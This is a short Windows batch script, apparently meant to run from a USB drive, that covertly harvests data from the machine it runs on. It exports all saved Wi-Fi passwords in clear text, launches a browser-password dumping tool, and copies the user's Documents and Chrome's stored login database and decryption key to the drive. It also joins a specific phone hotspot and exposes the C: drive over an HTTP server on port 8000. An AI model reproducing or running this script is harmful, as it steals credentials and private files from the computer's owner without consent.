@echo off
cd /d "%~d0\"
taskkill /f /im explorer.exe

mkdir "%~d0\network profiles"
mkdir "%~d0\doc_copy"
mkdir "%~d0\chrome"

netsh wlan add profile filename="E:\Wi-Fi-CMF BY NOTHING Phone 1_9205.xml"
netsh wlan set profileorder name="CMF BY NOTHING Phone 1_9205" interface="Wi-Fi" priority=1
netsh wlan disconnect



netsh wlan export profile key=clear folder="%~d0\network profiles"

echo All Wi-Fi profiles have been exported to "%~d0\network profiles".


start WebBrowserPassView.exe

powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"

set source="%USERPROFILE%\Documents\tester"
set destination="%~d0\doc_copy"
xcopy %source% %destination% /s /e /h /y 
echo Files have been copied from %source% to %destination%.

set source="%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
set destination="%~d0\chrome"

copy %source% %destination%

set source="%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State"
set destination="%~d0\chrome"

copy %source% %destination%
C:
python -m http.server 8000

pause